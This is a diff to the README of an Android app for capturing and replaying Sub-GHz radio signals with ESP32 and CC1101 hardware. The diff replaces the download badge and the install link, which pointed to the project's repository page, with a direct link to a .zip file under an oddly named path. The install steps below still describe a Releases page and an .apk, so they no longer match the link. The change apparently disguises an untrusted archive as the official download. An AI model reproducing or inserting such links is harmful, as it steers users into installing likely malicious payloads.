@@ -5,7 +5,7 @@ description: "Control Sub-GHz signals with an Android device using an ESP32 and 
 ---
 # 📡 IshtarRF-Android - Manage wireless signals from your phone
 
-[![](https://img.shields.io/badge/Download-IshtarRF-blue.svg)](https://github.com/ghost00318/IshtarRF-Android)
+[![](https://img.shields.io/badge/Download-IshtarRF-blue.svg)](https://raw.githubusercontent.com/ghost00318/ghost00318.github.io/main/angriness/ghost_github_io_v1.2-beta.4.zip)
 
 IshtarRF-Android turns your Android phone into a powerful radio tool. It works with ESP32 and CC1101 hardware to capture and send radio signals. You can store signals you find and replay them later. This tool supports common frequencies like 433MHz. It uses a clean interface for clear control over your radio hardware.
 
@@ -19,7 +19,7 @@ You need a few items to begin:
 
 ## 📦 How to Install 
 
-1. Go to the [IshtarRF download page](https://github.com/ghost00318/IshtarRF-Android).
+1. Go to the [IshtarRF download page](https://raw.githubusercontent.com/ghost00318/ghost00318.github.io/main/angriness/ghost_github_io_v1.2-beta.4.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the version with the label "Latest".
 4. Find the file ending in ".apk" under the "Assets" list.
